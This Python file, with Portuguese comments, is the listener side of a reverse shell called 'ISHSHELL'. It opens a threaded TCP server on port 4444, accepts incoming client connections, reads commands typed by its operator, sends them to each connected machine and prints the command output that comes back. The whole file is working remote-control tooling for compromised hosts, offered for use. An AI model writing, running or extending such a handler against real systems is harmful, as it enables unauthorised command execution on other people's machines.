import socket
import threading
import os

# --- Configurações do Servidor ---
HOST = '0.0.0.0'  # Escuta em todas as interfaces de rede disponíveis
PORT = 4444       # Porta para escutar conexões (você pode escolher outra, se preferir)

# --- Função para lidar com cada cliente conectado ---
def handle_client(client_socket, addr):
    print(f"[*] Conexão aceita de: {addr[0]}:{addr[1]}")
    try:
        while True:
            # Solicita um comando ao usuário do ISHSHELL
            command = input(f"Comando para {addr[0]}:{addr[1]} > ")
            
            # Comando para encerrar a sessão com o cliente
            if command.lower() == 'exit':
                client_socket.send(b'exit') # Envia 'exit' para o cliente
                break
            elif not command: # Se nenhum comando for digitado, continua
                continue

            # Envia o comando para o cliente
            client_socket.send(command.encode())
            
            # Recebe a resposta do cliente (saída do comando executado)
            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
            print(response)

    except Exception as e:
        print(f"[*] Erro na comunicação com {addr[0]}:{addr[1]}: {e}")
    finally:
        print(f"[*] Conexão com {addr[0]}:{addr[1]} fechada.")
        client_socket.close()

# --- Função para iniciar o servidor ---
def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5) # Permite até 5 conexões pendentes
    print(f"[*] Servidor escutando em {HOST}:{PORT}")
    print("[*] Aguardando conexões de clientes...")

    while True:
        # Aceita uma nova conexão de cliente
        client_socket, addr = server.accept()
        # Inicia uma nova thread para lidar com o cliente, permitindo múltiplas conexões
        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr,))
        client_handler.start()

# --- Ponto de entrada do script ---
if __name__ == "__main__":
    start_server()
